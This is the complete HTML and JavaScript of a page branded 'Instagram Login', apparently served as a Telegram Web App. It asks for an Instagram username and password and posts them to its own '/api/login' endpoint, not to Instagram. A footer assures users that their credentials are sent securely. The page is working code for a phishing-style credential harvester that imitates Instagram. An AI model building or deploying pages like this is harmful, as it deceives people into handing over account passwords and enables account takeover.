<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h2 {
            color: #333;
            font-size: 28px;
            font-weight: 700;
        }
        .logo span {
            color: #764ba2;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 600;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            transition: 0.3s;
            background: #f8f9fa;
        }
        input:focus {
            border-color: #667eea;
            outline: none;
            background: white;
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
        }
        button:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
        }
        button:disabled {
            opacity: 0.6;
            transform: none;
        }
        .message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 10px;
            display: none;
            font-size: 14px;
            text-align: center;
        }
        .message.success {
            display: block;
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .message.error {
            display: block;
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .loading {
            display: none;
            text-align: center;
            margin-top: 15px;
            color: #667eea;
        }
        .loading.show {
            display: block;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #999;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h2>🔐 <span>Instagram</span> Login</h2>
        </div>
        
        <form id="loginForm">
            <div class="input-group">
                <label>👤 Username</label>
                <input type="text" id="username" placeholder="Enter your Instagram username" required>
            </div>
            <div class="input-group">
                <label>🔑 Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" id="submitBtn">Login</button>
        </form>
        
        <div class="loading" id="loading">
            ⏳ Logging in to Instagram...
        </div>
        
        <div id="message" class="message"></div>
        <div class="footer">Your credentials are sent securely</div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            const messageDiv = document.getElementById('message');
            const loadingDiv = document.getElementById('loading');
            const btn = document.getElementById('submitBtn');
            
            if (!username || !password) {
                showMessage('Please fill in all fields', 'error');
                return;
            }
            
            // Show loading
            btn.disabled = true;
            btn.textContent = 'Logging in...';
            loadingDiv.classList.add('show');
            messageDiv.className = 'message';
            messageDiv.textContent = '';
            
            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({username, password})
                });
                
                const data = await response.json();
                
                if (response.ok) {
                    showMessage('✅ ' + data.message, 'success');
                    document.getElementById('loginForm').reset();
                    // Close Web App after 2 seconds (for Telegram)
                    setTimeout(() => {
                        if (window.Telegram && Telegram.WebApp) {
                            Telegram.WebApp.close();
                        }
                    }, 2000);
                } else {
                    showMessage('❌ ' + data.error, 'error');
                }
            } catch (error) {
                showMessage('❌ Connection error. Please try again.', 'error');
            }
            
            btn.disabled = false;
            btn.textContent = 'Login';
            loadingDiv.classList.remove('show');
        });
        
        function showMessage(text, type) {
            const messageDiv = document.getElementById('message');
            messageDiv.textContent = text;
            messageDiv.className = 'message ' + type;
        }
        
        // Auto-close Telegram Web App if user cancels
        if (window.Telegram && Telegram.WebApp) {
            Telegram.WebApp.ready();
        }
    </script>
</body>
</html>
